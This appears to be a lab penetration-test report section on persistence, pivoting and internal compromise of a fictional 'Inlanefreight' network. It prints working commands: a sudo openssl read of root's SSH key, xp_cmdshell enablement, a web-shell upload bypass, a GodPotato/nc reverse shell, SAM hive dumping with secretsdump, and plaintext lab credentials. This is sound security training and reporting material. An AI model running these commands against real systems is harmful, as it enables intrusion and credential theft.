#### Internal Attack — Persistence, Pivoting & Internal Foothold

*Continued from External Attack (Part 2). Starting position: a foothold as `srvadm` on `dmz01` (172.16.8.120 / DMZ-facing host), via command injection on monitoring.inlanefreight.local.*

---

#### Persistence on dmz01

The recovered `srvadm` / `ILFreightnixadm!` credential pair was used to establish a stable SSH session to `dmz01` (in place of the fragile command-injection shell), avoiding repeated re-exploitation at the start of each testing session.

**Local privilege escalation.** `sudo -l` showed `srvadm` could run `/usr/bin/openssl` as root, passwordless:

```
User srvadm may run the following commands on dmz01:
  (ALL) NOPASSWD: /usr/bin/openssl
```

This is a well-documented GTFOBins privilege escalation vector. Rather than reading `/etc/shadow`, the root user's SSH private key was read directly via OpenSSL's file-read primitive:

```
srvadm@dmz01:~$ LFILE=/root/.ssh/id_rsa
srvadm@dmz01:~$ sudo /usr/bin/openssl enc -in $LFILE
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
```

**Finding: Privilege Escalation via Misconfigured Sudo Rule (openssl) — High risk.** The recovered key provided direct root SSH access, confirmed and retained as a durable "save point" for the remainder of the engagement:

```
root@dmz01:~# ls
flag.txt  snap
```

---

#### Pivoting into 172.16.8.0/23

With root SSH access to `dmz01`, SSH dynamic port forwarding (`ssh -D 8081 -i id_rsa root@<dmz01>`) was used together with ProxyChains to reach the internal `172.16.8.0/23` segment directly from the attack host. The pivot was validated with a ProxyChains-wrapped Nmap scan confirming reachability of `dmz01`'s internal interface (172.16.8.120).

A ping sweep from `dmz01` identified three additional internal hosts: `172.16.8.3`, `172.16.8.20`, `172.16.8.50`. A static Nmap binary uploaded to `dmz01` was used for full host/service enumeration (full output: `Evidence/Scans/Service/Service_evidence.md`):

| Host | Notable ports | Assessment |
|---|---|---|
| 172.16.8.3 | 53, 88, 135, 139, 389, 445, 464, 593, 636 | Domain Controller (Kerberos/LDAP) — `DC01.INLANEFREIGHT.LOCAL` |
| 172.16.8.20 | 80, 111, 135, 139, 445, 2049, 3389 | Windows host running a web app + NFS — later identified as `ACADEMY-AEN-DEV01` |
| 172.16.8.50 | 135, 139, 445, 3389, 8080 | Windows host, non-standard web port |

An unauthenticated `enum4linux-ng` sweep against the DC (172.16.8.3) confirmed the domain name `INLANEFREIGHT.LOCAL`, SMB signing required, and no further anonymous access (RPC user/group/share enumeration was denied). Full output: `Evidence/Scans/AD Enumeration/AD_Enumeration_evidence.md`.

---

#### Finding: DEV01 (172.16.8.20) — Exposed NFS Share with Hardcoded Credentials

Port 80 on this host resolved to a DotNetNuke (DNN) CMS instance (a development server, per the DEV01 hostname). Self-registration required admin approval and did not yield access.

The open NFS service (port 2049) exposed an anonymously-accessible export, `/DEV01`:

```
$ proxychains showmount -e 172.16.8.20
Export list for 172.16.8.20:
/DEV01 (everyone)
```

Mounted from `dmz01` (root access), the export contained the DNN application source, including its `web.config` file — which disclosed the DNN Administrator's plaintext password:

```
<username>Administrator</username>
<password>
    <value>D0tn31Nuk3R0ck$$@123</value>
</password>
```

**Findings: Insecure File Shares (anonymous NFS access) and Sensitive Data Exposed via File Shares (credentials in `web.config`) — High risk.** Even where anonymous access is restricted, similarly-scoped shares open to all Domain Users would carry the same risk if they exposed data unrelated to normal job duties.

A `tcpdump` capture was also taken on `dmz01`'s internal interface to check for incidental cleartext credential exposure on the wire; no traffic of interest was captured during the observation window. Full output: `Evidence/Logging output/Logging_output_evidence.md`.

---

#### Finding: DEV01 — DNN Administrative Compromise → SYSTEM → Domain Credentials

The recovered DNN Administrator credentials (`Administrator` / `D0tn31Nuk3R0ck$$@123`) provided full SuperUser access to the DNN application.

![[Pasted image 20260628070739.png]]

**Path 1 — SQL console / `xp_cmdshell`.** DNN's built-in SQL console (Settings page) allowed enabling `xp_cmdshell`, providing direct OS command execution:

```sql
EXEC sp_configure 'show advanced options', '1'
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', '1' 
RECONFIGURE
```

![[Pasted image 20260628070855.png]]

**Path 2 — file-extension bypass.** DNN's allowed file-extension list (Settings → Security → More Security Settings) could be modified to permit `.asp`/`.aspx` uploads, allowing a web shell to be placed via the built-in file manager for direct RCE as an alternative to the SQL console.

![[Pasted image 20260628073853.png]]

**Privilege escalation to SYSTEM.** The web shell's context showed `SeImpersonate` privileges. The allowed-extensions bypass was reused to upload `PrintSpoofer64.exe`/`GodPotato-NET4.exe` and `nc.exe`, and a reverse shell was triggered as SYSTEM:

```
c:\DotNetNuke\Portals\0\GodPotato-NET4.exe -cmd "c:\DotNetNuke\Portals\0\nc.exe 172.16.8.120 443 -e cmd"
```

```
C:\Windows\system32>whoami
nt authority\system
C:\Windows\system32>hostname
ACADEMY-AEN-DEV01
```

**Credential extraction.** With SYSTEM access, the SAM, SECURITY, and SYSTEM registry hives were saved locally and exfiltrated (via the same file-extension bypass) for offline processing with `secretsdump.py`:

```
reg save HKLM\SYSTEM SYSTEM.SAVE
reg save HKLM\SECURITY SECURITY.SAVE
reg save HKLM\SAM SAM.SAVE
```

```
$ secretsdump.py LOCAL -system SYSTEM.SAVE -sam SAM.SAVE -security SECURITY.SAVE
...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<redacted>:::
[*] DefaultPassword 
(Unknown User):Gr8hambino!
```

The local Administrator hash was validated with CrackMapExec (`Pwn3d!`), and the cleartext `DefaultPassword` LSA secret was confirmed — via a further CrackMapExec/WinRM check and `net user /dom` — to belong to the domain user **hporter**, yielding the first set of valid Active Directory credentials: `INLANEFREIGHT.LOCAL\hporter` / `Gr8hambino!`.

Full secretsdump, CrackMapExec, and Evil-WinRM output: `Evidence/Scans/AD Enumeration/AD_Enumeration_evidence.md` and `Evidence/Misc files/Misc_Files_evidence.md`.

**Findings for DEV01:** the compromise chain (Insecure File Shares → SQL Console/`xp_cmdshell` or arbitrary file upload → SeImpersonate privilege escalation → SYSTEM → credential harvesting) is also reportable as a **PrintNightmare / Potato-family privilege escalation exposure**, since the same host was independently vulnerable to PrintNightmare.

---

#### Pivoting Note — Reverse Port Forwarding (Alternative Technique)

As an alternative to direct payload delivery, SSH remote/reverse port forwarding through `dmz01` was validated as a way to route a Meterpreter callback from `DEV01` back to the attack host without a direct route between the two networks (`ssh -R 172.16.8.120:443:0.0.0.0:7000 ...`, paired with a `multi/handler` listener). This requires `GatewayPorts yes` on the pivot host's `sshd_config` — a temporary configuration change that, if used on a real engagement, must be authorized, documented, and reverted at the end of testing. Full walkthrough: `Evidence/Notes/Notes_evidence.md`.

---

*Result: a full internal foothold, an established pivot into 172.16.8.0/23, and the first valid Active Directory credential pair. Continued in Lateral Movement — Active Directory Compromise.*
